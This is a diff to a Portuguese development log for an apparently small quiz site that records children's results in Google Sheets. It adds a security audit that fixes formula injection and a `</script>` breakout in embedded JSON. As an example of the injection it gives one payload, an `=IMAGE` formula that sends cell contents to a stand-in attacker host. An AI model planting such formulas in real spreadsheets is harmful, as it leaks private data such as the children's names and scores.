@@ -168,3 +168,31 @@ secret do repositório. O build passou a imprimir "envio para a planilha: ATIVO"
 
 Ficam na planilha 2 linhas de `Marco (teste)` deste teste. São filtradas no
 dashboard (servidor e cliente) e não entram na calibragem.
+
+## 2026-08-25 — Auditoria de injection
+
+Revisão dos pontos onde dado externo vira HTML ou célula de planilha.
+
+- **fix (sério)**: injeção de fórmula no Sheets. O `doPost` é público de
+  propósito e a URL está no HTML publicado — qualquer um que veja o fonte da
+  página consegue gravar linhas. O Sheets trata string começada por `= + - @`
+  como fórmula, então dava para plantar `=IMAGE("http://atacante/"&A2)`: o
+  Sheets buscaria a imagem e o conteúdo da célula sairia dentro da URL do
+  request. Numa planilha com nome e desempenho de crianças, isso é vazamento.
+  `celula_` passa a prefixar apóstrofo nesses casos e a limitar strings a 300
+  caracteres. Números e booleanos passam intactos.
+- **fix**: `</script>` dentro do JSON da prova fecharia a tag cedo no
+  `build.mjs`, transformando o resto em HTML executável. O JSON contém HTML de
+  propósito (regra, aula), então é armadilha para nós mesmos no dia em que uma
+  questão precisar falar da tag. `<` vira `\u003c`; o `JSON.parse` desfaz.
+  O `<title>` também passou a ser escapado. O dashboard já fazia isso.
+
+**Sem achado**: o dashboard escapa todo campo de texto vindo da planilha
+(`aluna`, `materia`, `tema_id`, `subtema`); os demais são números calculados.
+As ferramentas de língua usam `textContent`, não `innerHTML`. Bloquear linha
+legítima via dedup é impraticável — `evento_id` carrega id aleatório.
+
+**Risco aceito e conhecido**: qualquer um com a URL pode gravar linhas
+plausíveis (poluir o log). Não há como autenticar sem pôr segredo no HTML
+público, o que não resolveria nada. A coluna `aluna` e o filtro `(teste)`
+limitam o estrago à calibragem, não ao acesso.
